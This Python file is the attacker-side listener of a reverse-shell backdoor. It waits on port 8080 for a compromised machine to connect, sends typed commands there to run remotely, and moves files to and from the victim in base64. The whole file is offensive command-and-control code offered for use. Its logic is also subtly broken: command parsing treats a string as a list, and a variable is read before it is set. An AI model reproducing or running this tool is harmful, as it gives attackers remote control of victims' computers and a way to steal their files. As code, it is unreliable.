import socket
import json
import base64
import subprocess


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.ip = ip
        self.port = port
        self.host_name = socket.gethostname()

        listener.bind((self.ip, self.port))
        listener.listen(4)

        server_about = {
            "HostName": self.host_name,
            "Ip": self.ip,
            "Port": self.port
        }

        print("[+] Server info")
        for key in server_about:
            print(f"{key} <-> {server_about[key]}")

        print("\n[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection -> from :: {str(address)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data = json_data.encode("utf-8")
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)
            result = self.reliable_receive().encode("utf-8")
            result = result.decode("utf-8")
            return result
        except AttributeError:
            return "[-] AttributeError"

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, 'rb')as file:
            return base64.b64encode(file.read())

    def run(self):
        try:
            while True:
                command = str(input(">> "))

                try:
                    if command[0] == "download":
                        print(f"[+] Downloading file as {command[1]}")
                        result = self.write_file(command[1], result)
                    if command[0] == "upload" and "[-] Error" not in result:
                        file_content = self.read_file(command[1])
                        command.append(file_content)
                except Exception:
                    result = "[-] Error during comand execution ::Srver::"

                result = self.execute_remotely(command)
                print(result)
        except KeyboardInterrupt:
            print("\n[-] Quiting")
            self.connection.close()
            exit()


if __name__ == "__main__":

    term: bool = True

    if term:
        subprocess.call("clear")
        tag = ["╔═╗╔═╗╔═══╗╔═══╗╔═╗─╔╗",
               "║║╚╝║║║╔═╗║║╔═╗║║║╚╗║║",
               "║╔╗╔╗║║║─║║║║─║║║╔╗╚╝║",
               "║║║║║║║║─║║║║─║║║║╚╗║║",
               "║║║║║║║╚═╝║║╚═╝║║║─║║║",
               "╚╝╚╝╚╝╚═══╝╚═══╝╚╝─╚═╝"]

        for i in tag:
            print(f"\t{i}")
        print("-"*42)


    ip = socket.gethostbyname(socket.gethostname())
    port = 8080
    listener = Listener(ip, port)
    listener.run()
